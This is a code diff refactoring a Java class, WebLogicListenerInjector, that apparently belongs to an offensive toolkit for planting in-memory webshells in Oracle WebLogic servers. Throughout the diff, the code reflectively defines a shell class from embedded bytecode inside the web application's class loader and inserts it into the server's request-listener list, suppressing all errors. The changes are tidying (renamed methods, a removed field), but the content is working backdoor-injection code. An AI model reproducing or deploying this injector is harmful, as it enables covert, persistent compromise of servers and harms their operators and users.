@@ -19,10 +19,9 @@ import java.util.zip.GZIPInputStream;
  */
 public class WebLogicListenerInjector {
 
-    private static String urlPattern;
     private static String shellClassName;
     private static String shellClass;
-    private static boolean ok = false;
+    private static boolean ok;
 
     public WebLogicListenerInjector() {
         if (ok) {
@@ -37,8 +36,8 @@ public class WebLogicListenerInjector {
         if (contexts != null && !contexts.isEmpty()) {
             for (Object context : contexts) {
                 try {
-                    Object shell = getShell(context);
-                    inject(context, shell);
+                    loadShell(context);
+                    inject(context);
                 } catch (Throwable ignored) {
                 }
             }
@@ -46,7 +45,6 @@ public class WebLogicListenerInjector {
         ok = true;
         shellClass = null;
         shellClassName = null;
-        urlPattern = null;
     }
 
     /**
@@ -96,9 +94,9 @@ public class WebLogicListenerInjector {
     }
 
     @SuppressWarnings("all")
-    private Object getShell(Object context) throws Exception {
+    private void loadShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz = null;
+        Class<?> clazz;
         try {
             clazz = classLoader.loadClass(shellClassName);
         } catch (Exception e) {
@@ -107,11 +105,11 @@ public class WebLogicListenerInjector {
             defineClass.setAccessible(true);
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
-        return clazz.newInstance();
+        clazz.newInstance();
     }
 
     @SuppressWarnings("unchecked")
-    public void inject(Object context, Object listener) throws Exception {
+    private void inject(Object context) throws Exception {
         List<Object> requestListeners = (List<Object>) getFieldValue(getFieldValue(context, "eventsManager"), "requestListeners");
         for (Object requestListener : requestListeners) {
             if (requestListener.getClass().getName().contains(shellClassName)) {
